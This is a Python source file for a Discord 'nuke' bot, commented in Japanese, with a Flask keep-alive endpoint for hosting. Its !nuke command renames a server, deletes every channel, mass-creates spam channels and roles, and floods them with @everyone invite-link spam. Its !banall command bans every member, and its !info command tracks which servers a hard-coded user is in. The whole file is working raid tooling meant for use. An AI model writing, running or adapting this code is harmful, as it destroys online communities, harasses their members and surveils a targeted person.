import os
import threading
import discord
from discord.ext import commands
from discord import utils
from flask import Flask, jsonify
import logging
import asyncio
import random 

# ログ設定: 警告レベル以上のみ表示
logging.basicConfig(level=logging.WARNING)

# 🚨 保護対象サーバーIDの定義
EXCLUDED_GUILD_ID = 1443617254871662642

# --- KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 破壊機能に必要なインテントを全て有効化
intents.guilds = True
intents.members = True 
intents.message_content = True 

# 🚨 Prefixを '!' に設定
bot = commands.Bot(command_prefix="!", intents=intents)

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing. Please set the environment variable.")

except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 最終破壊機能 (!nuke コマンド) ---
# ----------------------------------------------------

@bot.command(name="nuke") 
@commands.has_permissions(administrator=True, manage_guild=True) 
async def ultimate_nuke_command(ctx): 
    
    guild = ctx.guild
    
    # 🚨 サーバーIDによる無効化チェック
    if guild.id == EXCLUDED_GUILD_ID:
        await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
        return
    
    # ------------------- 破壊開始 -------------------
    await ctx.send(
        f"🔥🔥🔥 **INSTANT NUKE STARTED!** 猶予なし！{ctx.author.mention} の命令により、破壊工作を開始する！ 🔥🔥🔥"
    )

    # 0. サーバー名の変更
    new_server_name = "るるくんの増殖植民地"
    try:
        await guild.edit(name=new_server_name, reason="ruru by nuke - Server Name Takeover")
        await ctx.send(f"💥 **SERVER NAME TAKEOVER!** サーバー名を「{new_server_name}」に変更したぜ！")
    except Exception as e:
        await ctx.send("⚠️ **サーバー名変更失敗:** Botの権限が不足しているか、Botのロールが最上位にない。")
        logging.error(f"SERVER NAME CHANGE ERROR: {e}")


    # 1. 全てのチャンネルを削除
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
        await asyncio.sleep(0.5) 
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 絵文字チャンネルを150個作成
    creation_tasks = []
    num_channels_to_create = 150
    
    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
    EMOJI_LIST = list(EMOJIS) 
    
    channel_names = []
    for i in range(15): 
        for emoji in EMOJI_LIST: 
            channel_names.append(f"{emoji}-nuke-{i}") 
            
    num_channels = len(channel_names)
    logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")

    for name in channel_names:
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
        await asyncio.sleep(1.0) 
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
        
    # 2.5. ロールスパム機能 (20個のロール作成)
    role_count = 20
    role_name = "ruru by nuke"
    
    if successful_channels:
        await successful_channels[0].send(f"💥 **ROLE SPAM INITIATED!** チャンネルと並行して {role_count}個のスパムロールを作成中だ！")
    
    role_creation_tasks = []
    for i in range(role_count):
        color = discord.Color(random.randint(0, 0xFFFFFF))
        role_creation_tasks.append(asyncio.create_task(
            guild.create_role(
                name=f"{role_name} {i+1}", 
                color=color, 
                reason="Role Spam by Nuke Bot"
            )
        ))
        
    try:
        await asyncio.gather(*role_creation_tasks)
        if successful_channels:
            await successful_channels[0].send(f"✅ **ROLE SPAM COMPLETE!** {role_count}個のロールリスト汚染に成功したぞ！")
    except Exception as e:
        logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")


    # 3. 全ての新しいチャンネルにスパムメッセージを20回送信 (ランダム遅延付き)
    if successful_channels:
        spam_message_content = (
            "# @everyoneruru by nuke😂\n"
            "# ⬇️join now⬇️\n"
            "https://discord.gg/Uv4dh5nZz6\n"
            "https://imgur.com/NbBGFcf"
        )
        spam_count = 20
        
        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**宣伝スパム**を送りつけるぞ！")

        
        for i, channel in enumerate(successful_channels):
            for j in range(spam_count):
                try:
                    await channel.send(spam_message_content)
                    delay = random.uniform(1.0, 3.0)
                    await asyncio.sleep(delay) 
                    
                except Exception as e:
                    logging.warning(f"チャンネル {channel.name} ({i+1}/{len(successful_channels)}) へのメッセージ送信中にエラーが発生。中断するぜ: {e}")
                    break
            
            if i < len(successful_channels) - 1:
                channel_delay = random.uniform(3.0, 5.0)
                logging.info(f"チャンネル {i+1} 完了。次のチャンネルへ移行するまで {channel_delay:.2f}秒待機。")
                await asyncio.sleep(channel_delay)


    # 4. 最終報告
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**サーバー名、絵文字、宣伝、ロールで完全に汚染された**！\n"
            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
        )
    

# ----------------------------------------------------
# --- 💀 全員BAN機能 (!banall コマンド) ---
# ----------------------------------------------------

@bot.command(name="banall") 
@commands.has_permissions(administrator=True) 
async def ban_all_members(ctx):
    guild = ctx.guild

    # 🚨 サーバーIDによる無効化チェック
    if guild.id == EXCLUDED_GUILD_ID:
        await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
        return
        
    # ------------------- 破壊開始 -------------------
    await ctx.send("🚨 **MASS BAN INITIATED!** 全メンバーをサーバーから叩き出す！")
    
    ban_tasks = []
    
    for member in guild.members:
        # Bot自身とサーバーオーナーはBANできない
        if member.id == bot.user.id or member == guild.owner:
            continue
        
        ban_tasks.append(asyncio.create_task(member.ban(reason="ruru by nuke - BAN ALL")))
        
    try:
        await asyncio.gather(*ban_tasks)
        banned_count = len(ban_tasks)
        await ctx.send(f"👑 **BAN ALL COMPLETE!** 成功したBAN処理数: {banned_count}。サーバーは人間を失い、完全に破壊された！")
    except Exception as e:
        await ctx.send(f"⚠️ **BAN中にエラー発生:** 一部のメンバーをBANできなかったぜ。しかし、破壊は進んだ！")
        logging.error(f"BAN ALL ERROR: {e}")


# ----------------------------------------------------
# --- 💀 情報収集機能 (!info コマンド) ---
# ----------------------------------------------------
# (※!infoコマンドの内容は変更なし)
@bot.command(name="info") 
@commands.has_permissions(administrator=True) 
async def find_user_guilds(ctx):
    
    TARGET_USER_ID = 1392296075427319852 
    
    target_user = bot.get_user(TARGET_USER_ID)
    if not target_user:
        try:
            target_user = await bot.fetch_user(TARGET_USER_ID)
        except:
            await ctx.send(f"⚠️ **ユーザーが見つからねぇ！** ID: `{TARGET_USER_ID}` のユーザーは存在しないか、検索できなかったぜ。")
            return

    await ctx.send(f"🕵️ **情報収集開始！** ユーザー **{target_user.name}** がいるサーバーを探し出す...")
    
    found_guilds = []
    
    for guild in bot.guilds:
        try:
            member = guild.get_member(TARGET_USER_ID)
            
            if not member:
                member = await guild.fetch_member(TARGET_USER_ID)
            
            if member:
                found_guilds.append(f"-> **{guild.name}** (`{guild.id}`)")
                
        except discord.NotFound:
            pass
        except Exception as e:
            logging.warning(f"ギルド {guild.name} でメンバー検索中にエラーが発生したぜ: {e}")
            
    
    if found_guilds:
        response = f"👀 **監視結果！** ユーザー **{target_user.name}** は以下のサーバーにいるぞ！\n\n"
        response += "\n".join(found_guilds)
        await ctx.send(response)
    else:
        await ctx.send(f"❌ **失敗だ！** ユーザー **{target_user.name}** は、Botが入っているどのサーバーにも潜んでいなかったぜ！")


# ----------------------------------------------------
# --- Discord イベント & 起動 ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時に実行"""
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(name="究極の破壊準備... !nuke | !banall | !info")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
    logging.warning("スラッシュコマンドは無視。!nuke、!banall、!infoコマンドが有効になったぜ。")

@bot.event
async def on_message(message):
    """メッセージイベント"""
    if message.author.bot:
        return
        
    await bot.process_commands(message)


# ----------------------------------------------------
# --- KeepAlive Server (Render/Uptime Robot対応) ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

# Botを別スレッドで起動
bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        # Botの起動が完了していない場合は503エラーを返す
        return "Bot is starting up or failed to start...", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """冗長的なヘルスチェックエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
